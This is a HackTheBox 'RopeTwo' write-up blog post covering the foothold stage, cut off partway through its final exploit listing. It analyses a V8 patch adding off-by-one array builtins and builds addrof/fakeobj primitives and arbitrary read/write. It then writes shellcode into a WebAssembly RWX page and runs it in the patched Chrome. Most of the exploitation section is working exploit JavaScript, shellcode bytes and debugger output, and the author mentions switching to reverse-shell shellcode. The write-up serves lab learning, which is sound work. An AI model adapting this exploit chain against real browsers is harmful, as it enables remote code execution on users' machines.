---
title:      "HTB: RopeTwo Writeup"
subtitle:   "Write-Up"
date:       2021-01-03
author:     "D4mianwayne"
img:       "/img/ropetwo/banner.png"
tags:    ["pwn, hackthebox, v8, kernel, heap, tcache, libc-2.29"]
categories: ["HackTheBox"] 
layout: "single"
showTableOfContents: true
---


This box was without a second thought one of the favourite box of mine on HackTheBox so far, since I am more of a pwn and reverse engineering person, this machine was a challenge, an outstanding one which pushed my learning skills more further because upto the moment I really went into this, I was not a good at heap exploitation, more skeptical about the V8 exploitation skills of mine and of course I knew nothing of the kernel pwn, so this was a way to tackle every weakness of mine, hope you find the writeup useful, I'll include the link of the attachments at the very bottom to my files, QEMU enviornment for the kernel pwn and the exploits, without further ado, let's start.


# Foothold

So, as this became kind of obvious that the foothold required the V8 exploitation as the rumors went by. But apart from that, I started scanning the ports as I was unclear myself where and how things are on this machine, now starting off, I used nmap to scan the ports:-

```asm
➜ ✔ nmap -sV -sC -A 10.10.10.196
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-16 21:57 IST
Nmap scan report for 10.10.10.196
Host is up (0.83s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bc:d9:40:18:5e:2b:2b:12:3d:0b:1f:f3:6f:03:1b:8f (RSA)
|   256 15:23:6f:a6:d8:13:6e:c4:5b:c5:4a:6f:5a:6b:0b:4d (ECDSA)
|_  256 83:44:a5:b4:88:c2:e9:28:41:6a:da:9e:a8:3a:10:90 (ED25519)
5000/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.196:5000/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
8000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.7.3)
|_http-server-header: Werkzeug/0.14.1 Python/3.7.3
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.64 seconds

```

The port 22 was open, being the SSh, the other two were the ones running the webserver, port 5000 was running the GitLab and the port 8000 running a webserver. 
Checking the port 5000:

![](/img/ropetwo/8000.png)
It seemed like the portfolio for a company showing their own version of V8 engine, which is the JavaScript Engine for the chromium based browsers, there was a download link for the browser, so without any second thought I downloaded it.

From the name of the archive it seemed like the chromium browser compressed into the POSIX tar archive, after extracting it seemed like the chromium browser as we expected it to be, although running it, just spawned the chromium browser, so that was it, nothing special came out of this. 

Now, that being aside, the only port that was 8000, we had a link at the footer of the page which said **Source**, opening the link, we immediately see a subdomain `gitlab.ropetwo.htb`, which was as follows:-

![](/img/ropetwo/gitlab.png)

## V8 Exploitation

We immediately, sees a commit which was made, as I did some v8 pwn, I went to check on commit and found the `diff` file, using so, I moved further and started building v8 engine binary d8, I used the commit, prior to the `r4j` user made, which was at [here](http:///gitlab.rope2.htb:5000/root/v8/commit/d91e8d8fca64679c8df05603b5ff7e58709c4801)

Now, first of all, we didn't has much thing to get started, as for starting to pwn the v8 engine of it, we had to build the binary named `d8`, since that was not provided. I fetched the v8 engine code from the google and checkout the last commit which was mentioned in the GitLab, following are the steps one could replicate to make their own version of the d8 by applying the `diff` file.

```asm
d4mian@pwnbox:~$ fetch v8
d4mian@pwnbox:~$ cd v8
d4mian@pwnbox:~/v8$ ./build/install-build-deps.sh    
d4mian@pwnbox:~/v8$ git checkout d91e8d8fca64679c8df05603b5ff7e58709c4801
d4mian@pwnbox:~/v8$ gclient sync
d4mian@pwnbox:~/v8$ git apply ../patch.diff 
d4mian@pwnbox:~/v8$ ./tools/dev/v8gen.py x64.release
d4mian@pwnbox:~/v8$ ninja -C ./out.gn/x64.release
d4mian@pwnbox:~/v8$ ./tools/dev/v8gen.py x64.debug
d4mian@pwnbox:~/v8$ ninja -C ./out.gn/x64.debug
```

This took some time, approximately 3 hours on my VM which had 3GB of RAM and 1 core, though I made both the debug version and release version, but the release version was more helpful because before doing this v8 exploitation challenge, I did the DownUnderCTF's "Is it Pwn or Web?" challenge which was close to same to this one, that being said, let's get started.


> Attachment: The `d8` binary and the exploits can be found here: <https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/Foothold>


The only obstacle one would really stumble upon during this challenge is the use of the Pointer Compression, this made the address representation in 32 bit, which resulted in the leak being hard to make something of, since the isolate root, the upper 32 bit value of an address which is used to access the data around the V8 heap turned out to be an issue. But going through this [blog](), this mentioned that we do not need to know about the isolate root address, if we could manage to massage the vulnerability to get `fakeobj` and the `addrof` primitive, then we can get through the pointer compression which would result in not being a problem.

First of all, we need to analyse the patch file such that we spot which commit specifically pushed changes and pushed it where exactly:-

```diff
~/Pwning/HackTheBox/htb-rope2 $ cat patch.diff 
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 3c2fe33c5b4b330c509d2926bc1e30daa1e09dba..99f0271e035220cd7228e8f9d8959e3b248a6cb5 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -297,6 +297,34 @@ BUILTIN(ArrayPrototypeFill) {
   return GenericArrayFill(isolate, receiver, value, start_index, end_index);
 }
 
+BUILTIN(ArrayGetLastElement)
+{
+	Handle<JSReceiver> receiver;
+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver()));
+	Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+	uint32_t len = static_cast<uint32_t>(array->length().Number());
+	FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+	return *(isolate->factory()->NewNumber(elements.get_scalar(len)));
+}
+
+BUILTIN(ArraySetLastElement)
+{
+	Handle<JSReceiver> receiver;
+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver()));
+	int arg_count = args.length();
+	if (arg_count != 2) // first value is always this
+	{
+		return ReadOnlyRoots(isolate).undefined_value();
+	}
+	Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+	uint32_t len = static_cast<uint32_t>(array->length().Number());
+	Handle<Object> value;
+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, value, Object::ToNumber(isolate, args.atOrUndefined(isolate,1)));
+	FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+	elements.set(len,value->Number());
+	return ReadOnlyRoots(isolate).undefined_value();
+}
+
 namespace {
 V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
                                               BuiltinArguments* args) {
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 92a430aa2c0cbc3d65fdf2f1f4f295824379dbd8..02982b1c858eb313befcb8ad9e396dcdfbf2f9ab 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -319,6 +319,8 @@ namespace internal {
   TFJ(ArrayPrototypePop, kDontAdaptArgumentsSentinel)                          \
   /* ES6 #sec-array.prototype.push */                                          \
   CPP(ArrayPush)                                                               \
+  CPP(ArrayGetLastElement)                                                     \
+  CPP(ArraySetLastElement)                                                     \
   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \
   /* ES6 #sec-array.prototype.shift */                                         \
   CPP(ArrayShift)                                                              \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 6d53531f1cbf9b6669c6b98ea8779e8133babe8d..5db31e9b733cdaa1dd2049b72b7fb6392ea4a1ab 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1706,6 +1706,11 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
     // Array functions.
     case Builtins::kArrayIsArray:
       return Type::Boolean();
+    case Builtins::kArrayGetLastElement:
+      return Type::Receiver();
+    case Builtins::kArraySetLastElement:
+      return Type::Receiver();
+
     case Builtins::kArrayConcat:
       return Type::Receiver();
     case Builtins::kArrayEvery:
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 7fd1e40f661461fdbcf9228c5ce9127c3428dc7b..3a9b97e4b6426e101ca0cdc97ce1cc92aa689968 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -1660,6 +1660,10 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           Builtins::kArrayPrototypeLastIndexOf, 1, false);
     SimpleInstallFunction(isolate_, proto, "pop", Builtins::kArrayPrototypePop,
                           0, false);
+    SimpleInstallFunction(isolate_, proto, "GetLastElement", Builtins::kArrayGetLastElement,
+                          0, false);
+    SimpleInstallFunction(isolate_, proto, "SetLastElement", Builtins::kArraySetLastElement,
+                          0, false);
     SimpleInstallFunction(isolate_, proto, "push",
                           Builtins::kArrayPrototypePush, 1, false);
     SimpleInstallFunction(isolate_, proto, "reverse",

```

Breaking this down, the following lines:-

```diff
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -297,6 +297,34 @@ BUILTIN(ArrayPrototypeFill) {
   return GenericArrayFill(isolate, receiver, value, start_index, end_index);
 }
 +BUILTIN(ArrayGetLastElement)
+{
+	Handle<JSReceiver> receiver;
+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver()));
+	Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+	uint32_t len = static_cast<uint32_t>(array->length().Number());
+	FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+	return *(isolate->factory()->NewNumber(elements.get_scalar(len)));
+}
+
+BUILTIN(ArraySetLastElement)
+{
+	Handle<JSReceiver> receiver;
+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver()));
+	int arg_count = args.length();
+	if (arg_count != 2) // first value is always this
+	{
+		return ReadOnlyRoots(isolate).undefined_value();
+	}
+	Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+	uint32_t len = static_cast<uint32_t>(array->length().Number());
+	Handle<Object> value;
+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, value, Object::ToNumber(isolate, args.atOrUndefined(isolate,1)));
+	FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+	elements.set(len,value->Number());
+	return ReadOnlyRoots(isolate).undefined_value();
+}
+
```

Here the `/src/builtins/builtins-array.c` is used to denote that there are some new functions which are being added, this being mentioned the following two functions which were added here is the `ArrayGetLastElement` and the `ArraySetLastElement`, let's break those down one by one:-

* The `ArrayGetLastElement` as the name implies, it gets the last element from the array, first off it calculates the length in the variable `len` the returns the element stored as the `len` index, now i =f you pay attention here, the `len` here is an absolute length of the array, we know that since an array indexing starts from the `0`, to access the 0th element we do `array[0]` but here since the element is stored in an array and the value which is at the `len` index is being hence allowing us for Out-Of-Bound read by 1 element.

* The `ArraySetLastElement` as the name says, this built-in function saves the value to the last index of the array, now here, as of the previous function, the `len` is counted by the length of the array and then elements defined would be overwritten at that index, `array[index] = element`. Yes, you're thinking corrrectly, we have Out-Of-Bound write here too but by 1 element.

So, as above mentioned we know that there are 2 functions that we have use in order to exploit this specific patch of the binary and eventually the chrome browser.

As this is also going to be very detailed blog post, we will understand the concepts first then we will move on eventually.



As JavaScript is a dynamically typed language, the engine must store type information with every runtime value. In v8, this is accomplished through a combination of pointer tagging and the use of dedicated type information objects, called Maps. These Maps are used to keep the track of the objects created at runtime, since this is how objects are handle, overwriting the map would lead to some internal type confusion within the V8 engine itself.
As of now, you might be thinking how exactly we access Maps and most importantly "How do we recognize a Map?", for this I used the debug version of the `d8` binary. that binary when run with the `allow-natives-syntax` will let you use the `%DebugPrint(<object>)` which will print the related information of the objects, let's say, for example, we declared the array with the elements and then use the `%DebugPrint(arr)` to get all the information about an objects including but not limited to:-

* Map address
* Element Pointer
* Type Information etc.

```asm
d4mian@pwnbox:~/Pwning/v8/out.gn/x64.debug$ gdb ./d8 
GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git

[..snip..]

Reading symbols from ./d8...done.
gef➤  r --allow-natives-syntax 
Starting program: /home/d4mian/Pwning/v8/out.gn/x64.debug/d8 --allow-natives-syntax
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff254f700 (LWP 8196)]
V8 version 8.5.0 (candidate)
d8> var arr = [1.1, 2.2, 3.3];
undefined
d8> %DebugPrint(arr)
DebugPrint: 0xe81080c5e45: [JSArray]
 - map: 0x0e8108281909 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x0e810824923d <JSArray[0]>
 - elements: 0x0e81080c5e25 <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
 - length: 3
 - properties: 0x0e81080406e9 <FixedArray[0]> {
    #length: 0x0e81081c0165 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x0e81080c5e25 <FixedDoubleArray[3]> {
           0: 1.1
           1: 2.2
           2: 3.3
 }
0xe8108281909: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x0e81082818e1 <Map(HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x0e81081c0451 <Cell value= 1>
 - instance descriptors #1: 0x0e8108249911 <DescriptorArray[1]>
 - transitions #1: 0x0e810824995d <TransitionArray[4]>Transition array #1:
     0x0e8108042f3d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x0e8108281931 <Map(HOLEY_DOUBLE_ELEMENTS)>

 - prototype: 0x0e810824923d <JSArray[0]>
 - constructor: 0x0e8108249111 <JSFunction Array (sfi = 0xe81081cc41d)>
 - dependent code: 0x0e81080401ed <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[1.1, 2.2, 3.3]
```

Now, breaking it down, we have the `arr` located at the `0xe81080c5e45` which is of type `JSArray` and it has it's map located at the `0x0e8108281909`, other than that, according to the information, it has a map of `PACKED_DOUBLE_ELEMENTS` which references to the `arr` having elements of double type. The element pointer is located at the `0x0e81080c5e25` which is of length 3 and is of type `FixedDoubleArray`. Now, using the gdb, we check the memory contents around the `arr`.

> To check the memory contents of the address, we need to subtract 1 from the address, such that we get absolute address for the analysis.

```asm
^C

[..snip..]

gef➤  x/4wx 0xe81080c5e45 - 1
0xe81080c5e44:	0x08281909	<----- Map           0x080406e9  <---- Properties
               0x080c5e25  <----- Element Array	0x00000006
```

From the debug information, using the `%DebugPrint(arr)`, and the gdb output, we can see that the 1st element belongs to the map of the array itself, the second belongs to the Properties, the third belongs to the elements array. If you pay attention, I used the `x/wx` which will show the address as 32 bit representation, the thing here is, the version of the commit made to the V8 engine was after the integration of the pointer compression, which made the addresses to be representated as the 32 bit integer.

```asm
gef➤  x/5xg 0x0e81080c5e25 - 1
0xe81080c5e24:	0x0000000608040a3d	0x3ff199999999999a
0xe81080c5e34:	0x400199999999999a	0x400a666666666666
0xe81080c5e44:	0x080406e908281909
gef➤  p/d 0x3ff199999999999a
$2 = 4607632778762754458
gef➤  p/f 0x3ff199999999999a
$3 = 1.1000000000000001
gef➤  p/f 0x400199999999999a
$4 = 2.2000000000000002
```

Now, since we know how an array is represented into the V8 heap and we also know that we have Off by One read and write vulnerability, which draw us to the conclusion of the we have the ability to overwrite the Map of an object. With this in mind, let's move on:-

***

First off, we need to make the utility functions such that we can deal with the pointer tagging and change the floating values to decimal and vice versa. The following JavaScript function will let us do the work mentioned:-


```js
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val, size) {

    f64_buf[0] = val;

    if(size == 32) {
        return BigInt(u64_buf[0]);
    } else if(size == 64) {
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
    }

}

function itof(val, size) {

    if(size == 32) {
        u64_buf[0] = Number(val & 0xffffffffn);
    } else if(size == 64) {
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 32n);
    }

    return f64_buf[0];

}
```
The above functions are used to convert the float to integer and integer to floats, since the memory address are going to be overwritten by their respected values as float, we need those.

Moving on, we need to create some float arrays, to get the required leaks, we also need them for doing the `fakeobj` and the `addrof` primitve, without further ado, let's start:-

```js
var float_arr = [1.1, 2.2, 3.3, 4.4, 5.5];
var obj = {"A":1.1};
var reg = [1, 2, 3, 4];
```

These are the variables that will be involved further in the exploit, next off, we need to get the `addrof` primitve, this means we need to leverage the off by one to read address of an object, let's see:-


```js
var float_arr_map = ftoi(float_arr.GetLastElement(), 32)
var reg_arr_map = float_arr_map - 0xa0n;

console.log("[*] Float array map   :  0x" + float_arr_map.toString(16));
console.log("[*] Regular array map :  0x" + reg_arr_map.toString(16));


function addrof(in_obj) {
	float_arr.SetLastElement(itof(reg_arr_map, 32));
	float_arr[0] = in_obj;
	float_arr.SetLastElement(itof(float_arr_map, 32));
	let addr = float_arr[0];
	return ftoi(addr, 64)
}
```
Here, first we get the map address of the `float_arr` and the `reg` array, then we have a function named `addrof`, this takes an object as the argument that would be the object address we need to get the address of, what we do is first overwrite the `float_arr` map object with the `reg` array, this means, as of now, the map address of the `float_arr` is pointing to the map of the `reg` array, then we make the first object of the `float_arr` to that of object we need to get the address of, then we place the map of the `float_arr` right back to where it was.

![addrof primitve](/img/ropetwo/addrof.png)

Considering, we have a map leak, if we try to read what is stored at that address, it will result in:-


```asm

```

Success, with this out of the way, as of the v8 exploitation goes, we need to have a `fakeobj` primitive. The `fakeobj` function is below:-

```js
function fakeobj(addr) {
	float_arr[0] = itof(addr, 32);
	float_arr.SetLastElement(itof(reg_arr_map, 32));
	let fake = float_arr[0];
	float_arr.SetLastElement(itof(float_arr_map, 32));
	return fake;
}
```

Let's talk about the `fakeobj` function, this primitive, in context of this vulnerability and specific patch, we put the address of the fake object we want to put, it is placed onto the first element of the `float_arr`, then we changed the map of the `float_arr` to the `reg` array's map, so when we tend to access the data from the 0th index, how this works is:-

![fakeobj primitive](/img/ropetwo/fakeobj.png)
* We put the address of the object we wamt to overwrite another object with.
* Set the map of the map of the `float_arr` to the map of the `reg`
* Get the fake object from the `float_arr`
* Put the map of the `float_arr` back to it's original place

These are the primitives, we needed to have before we jump into the read/write primitive, although with these out of the way, we can now work on our functions `arb_read` and `arb_write` which will be used to read address from/write values to an address respectively.

Moving on, the arbitrary read function is of interested and I'll try my best to explain, for the moment, consider the following function which is used to read a value from the arbitrary address:-

```js
var rw_helper = [itof(float_arr_map, 64), 1.1, 2.2, 3.3];
var rw_helper_addr = addrof(rw_helper) & 0xffffffffn;

console.log("[+] Controlled RW helper address: 0x" + rw_helper_addr.toString(16));

function arb_read(addr) {
    let fake = fakeobj(rw_helper_addr - 0x20n);
    rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
    return ftoi(fake[0], 64);
}
```

This function works by first, making a fake object via the `fakeobj` function, then we put the address we want to read from, it is written to the 1st index of the `rw_helper` array, then the first element from the `fake` object is wrong, this is the follow up of the function, which left the understanding of the whole logic, I explained it in steps with the help of the the `d8` binary and showing it:-

***
We create the `fakeobj`with the address of the `rw_helper`, we subtracted `0x20` from it because the 32 bytes are for the layout of the memory, in this case, we did it because>:-

```asm
gef➤  r --shell ./xpl.js --allow-natives-syntax
Starting program: /home/d4mianwayne/Pwning/HackTheBox/htb-rope2/d8 --shell ./xpl.js --allow-natives-syntax
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff7c1c700 (LWP 157278)]
[New Thread 0x7ffff741b700 (LWP 157279)]
[New Thread 0x7ffff6c1a700 (LWP 157280)]
[*] Float array map   :  0x8241909
[*] Regular array map :  0x8241869
[+] Controlled RW helper address: 0x808a14d
V8 version 8.5.0 (candidate)
d8> %DebugPrint(rw_helper);
0x16d50808a14d <JSArray[4]>
[6.7481182e-316, 1.1, 2.2, 3.3]
d8> ^C
gef➤  x/10xg 0x05a00808a14d - 1 - 0x30
0x5a00808a11c:	0x0000393638313432	0x0000000808040a3d
0x5a00808a12c:	0x0000000008241909	0x3ff199999999999a
0x5a00808a13c:	0x400199999999999a	0x400a666666666666
0x5a00808a14c:	0x080406e908241909	0x000000080808a125
0x5a00808a15c:	0x0000000208040975	0x0000000008241909
gef➤  x/10xg 0x05a00808a14d - 1 - 0x20
0x5a00808a12c:	0x0000000008241909	0x3ff199999999999a
0x5a00808a13c:	0x400199999999999a	0x400a666666666666
0x5a00808a14c:	0x080406e908241909	0x000000080808a125
0x5a00808a15c:	0x0000000208040975	0x0000000008241909
0x5a00808a16c:	0x0000000008040975	0x0000000008040245
gef➤  p 0x05a00808a14d  - 0x20
$5 = 0x5a00808a12d
gef➤  p 0x05a00808a14d  - 0x20 - 1
$6 = 0x5a00808a12c


If we place a fake object at the address `0x5a00808a12c`, we would be able to get the access to the index 1, which would be the `0x5a00808a13c`. This way, the resulted fake object would point to the value of the address we wanted.
```
 As for the write function, that also worked on the same princpile of the read function:-

 ```js
 function arb_write(addr, value) {
    let fake = fakeobj(rw_helper_addr - 0x20n);
    rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
    fake[0] = itof(value, 64);
}
```
This, if we break down the logic:-

* This, if compared to the function of the `arb_read`, this instead of returning the first value from `fake` array which was the result of faking the object, it overwrites the value that was stored at the first index.

```js
return ftoi(fake[0], 64);
```

The above is from the `arb_read`.

```js
fake[0] = itof(value, 64);
```

This is done by overwriting the value which was *being returned* in ther `read` function, from here we will leverage for the inital writing to, what we refer as the [WebAssembly Page in JS](https://developer.mozilla.org/en-US/docs/WebAssembly), so initially, you cannot start off with the classic pwn challenges one could use the approach of overwriting the `__free_hook` with of `system`, then spawn a shell, in the v8 based challenges, mostly CTFs, this is done by creation of a wasm function which would result in the creation of a `rwx` permission page in the memory layout of the program, from here the approach is following:-

* Find the `rwx` segment address, calculate the address of it.
* Write the shellcode to the area of the `rwx` segment.
* Call the wasm function created earlier, since shellcode would be written to that function, calling it will eventually result in the shellcode execution.


```js

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,
                               130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,
                               128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,
                               128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,
                               0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);
var wasm_module = new WebAssembly.Module(wasmCode);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var pwn = wasm_instance.exports.main;
```

This is the JS code which is used to create `pwn` function which would reside in the `rwx` section, with this step aside, let's move on:-

```js
var wasm_instance_addr = addrof(wasm_instance) & 0xffffffffn;
var rwx = arb_read(wasm_instance_addr + 0x68n & 0xffffffffn);
```
First off, we needed to find the base address of the `rwx` segment, this was easier to find since, all I had to do is to find the address stored throught the memory and from what offset, it was exactly located at, I used the `gef`'s `search-pattern rwx_address` and found the reference of that memory located at the offset `wasm_instance_addr + 0x68`:-

```asm
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00002f81a4494000 0x00002f81a4495000 0x0000000000000000 rwx 
0x00003ce700000000 0x00003ce70000c000 0x0000000000000000 rw- 
0x00003ce70000c000 0x00003ce700040000 0x0000000000000000 --- 
0x00003ce700040000 0x00003ce700041000 0x0000000000000000 rw- 
0x00003ce700041000 0x00003ce700042000 0x0000000000000000 --- 
0x00003ce700042000 0x00003ce700052000 0x0000000000000000 r-x 
0x00003ce700052000 0x00003ce70007f000 0x0000000000000000 --- 


[..snip..]

gef➤  search-pattern 0x00002f81a4494000
[+] Searching '\x00\x40\x49\xa4\x81\x2f\x00\x00' in memory
[+] In (0x3ce708080000-0x3ce70818d000), permission=rw-
  0x3ce70808a78c - 0x3ce70808a7ac  →   "\x00\x40\x49\xa4\x81\x2f\x00\x00[...]" 
  0x3ce70808a7d8 - 0x3ce70808a7f8  →   "\x00\x40\x49\xa4\x81\x2f\x00\x00[...]" 
[+] In (0x3ce708200000-0x3ce708280000), permission=rw-
  0x3ce708211230 - 0x3ce708211250  →   "\x00\x40\x49\xa4\x81\x2f\x00\x00[...]" 
[+] In '[heap]'(0x55555648d000-0x55555658a000), permission=rw-
  0x5555564dc618 - 0x5555564dc638  →   "\x00\x40\x49\xa4\x81\x2f\x00\x00[...]" 
  0x5555564df560 - 0x5555564df580  →   "\x00\x40\x49\xa4\x81\x2f\x00\x00[...]" 

[..snip..]

gef➤  p 0x00003ce700000000 + 0x82111c9
$1 = 0x3ce7082111c9
gef➤  p 0x3ce708211230 - 0x3ce7082111c9
$2 = 0x67
```


With the above out of the way, we need to know make use of `DataView` and `ArrayBuffer` as this will help you in overwriting the address with the desired value, in short these two functions allows you to write the data in binary format using the `ArrayBuffer`.

```js
console.log("[+] Wasm instance address: 0x" + wasm_instance_addr.toString(16));

console.log("[*] RWX INSTANCE:   0x" + rwx.toString(16));


var arr_buf = new ArrayBuffer(0x100);
var dataview = new DataView(arr_buf);
```

The backing store of an `ArrayBuffer` can be considered as same as the elements pointer of a `JSArray`. It is found at offset `&ArrayBuffer+0x14`, which you can find out by using the `x64.debug` version of `d8` binary. The principle of this is that instead of using a `fakeobj` to write directly to an arbitrary address, we use the fakeobj to do the `arb-write` and modify the backing store of a legitimate ArrayBuffer to our arbitrary address, which in this case would be overwritten with the `rwx` segment. Now, we can use `dataview.setBigUint64(0, val, true)` to write our val as a little-endian 64 bit value to our arbitrary address. This is shown below:-

```js
var arr_buf_addr = addrof(arr_buf) & 0xffffffffn;;
var back_store_addr = arb_read(arr_buf_addr + 0x14n);

console.log("[+] ArrayBuffer address: 0x" + arr_buf_addr.toString(16));
console.log("[+] Back store pointer: 0x" + back_store_addr.toString(16));

arb_write(arr_buf_addr + 0x14n, rwx);

var shellcode = [
    0x48, 0x31, 0xf6, 0x56, 0x48, 0x8d, 0x3d, 0x32,
    0x00, 0x00, 0x00, 0x57, 0x48, 0x89, 0xe2, 0x56,
    0x48, 0x8d, 0x3d, 0x0c, 0x00, 0x00, 0x00, 0x57,
    0x48, 0x89, 0xe6, 0xb8, 0x3b, 0x00, 0x00, 0x00,
    0x0f, 0x05, 0xcc, 0x2f, 0x75, 0x73, 0x72, 0x2f,
    0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e, 0x6f, 0x6d,
    0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c,
    0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53,
    0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00
  ];  // shellcode for spawning calculator8

for (let i = 0; i < shellcode.length; i++) {
  dataview.setUint8(i, shellcode[i], true);
}
```
Now, this aside, we just call the function `pwn` which would result in the execution of the shellcode:-

```js
pwn();
```
Run the exploit as `./d8 ./xpl.js` and we will see a successful calc pop:-

![calc_pop_d8](/img/ropetwo/d8_calc.png)

As it worked on `d8`, we must try it on the chrome binary which was distributed along from the port 8000, to run the exploit, we have to make a HTML file in which we will include the `pwn.js` file, the idea here is to use `--no-sandbox` which ultimately means no sandbox escape is being and all the JIT code must be executed on the system itself, the HTML file:-

```html
<html>
    <head>
       <script src="xpl.js"></script>
    </head>
</html>
```

Running the given chrome binary as `./chrome --no-sandbox ./xpl.html` resulted in the calculator being popped:-

![chrome calc pop](/img/ropetwo/chrome_calc.png)

Now, with this aside, first off I changed the shellcode from the previous to reverse shell shellcode, for which we will be using the exploit to get reverse shell, the final exploit looked like this:-

```js
var float_arr = [1.1, 2.2, 3.3, 4.4, 5.5];
var obj = {"A":1.1};
var reg = [1, 2, 3, 4];


var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val, size) {

    f64_buf[0] = val;

    if(size == 32) {
        return BigInt(u64_buf[0]);
    } else if(size == 64) {
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
    }

}

function itof(val, size) {

    if(size == 32) {
        u64_buf[0] = Number(val & 0xffffffffn);
    } else if(size == 64) {
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 32n);
    }

    return f64_buf[0];

}


var float_arr_map = ftoi(float_arr.GetLastElement(), 32)
var reg_arr_map = float_arr_map - 0xa0n;

console.log("[*] Float array map   :  0x" + float_arr_map.toString(16));
console.log("[*] Regular array map :  0x" + reg_arr_map.toString(16));


function addrof(in_obj) {
	float_arr.SetLastElement(itof(reg_arr_map, 32));
	float_arr[0] = in_obj;
	float_arr.SetLastElement(itof(float_arr_map, 32));
	let addr = float_arr[0];
	return ftoi(addr, 64)
}


function fakeobj(addr) {
	float_arr[0] = itof(addr, 32);
	float_arr.SetLastElement(itof(reg_arr_map, 32));
	let fake = float_arr[0];
	float_arr.SetLastElement(itof(float_arr_map, 32));
	return fake;
}


var rw_helper = [itof(float_arr_map, 64), 1.1, 2.2, 3.3];
var rw_helper_addr = addrof(rw_helper) & 0xffffffffn;

console.log("[+] Controlled RW helper address: 0x" + rw_helper_addr.toString(16));

function arb_read(addr) {
    let fake = fakeobj(rw_helper_addr - 0x20n);
    rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
